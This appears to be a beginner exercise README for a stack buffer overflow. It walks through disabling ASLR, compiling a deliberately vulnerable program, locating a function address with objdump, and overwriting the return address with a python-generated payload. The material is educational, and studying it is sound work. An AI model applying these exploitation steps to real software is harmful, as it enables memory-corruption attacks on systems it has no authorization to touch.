# [NEWBIE] Executing a function twice replacing the EIP address with BOF - EX 1

In this program we have a function (func) that it must be execute twice. For it we must to replace the return address with the address we want, in this case, it be with the function's address.

## Step 1

Disable the kernel ASLR

        kernel.randomize_va_space=0 //To disable
        kernel.randomize_va_space=1 //To enable again

## Step 2

Compile the program (victim.c) with the flags specified in the section 'params' of the same file.

## Step 3

Obtain the func memory address, for it you can use `objdump` tool pre-installed in the most of linux distros. With this tool, you can disassemble the binary and view their ASM code, and locate the func address.

        objdump -d victim -M intel | grep func
        
## Step 4

Now is moment to overflows the `name` array, for it is necessary a greater than 32 bytes input and fill the EBP and EIP register with the function address in little endian (in backwards)

        ./victim $(python -c "print 'A' * 32 + '\xf4\x83\x84\x08' * 8")
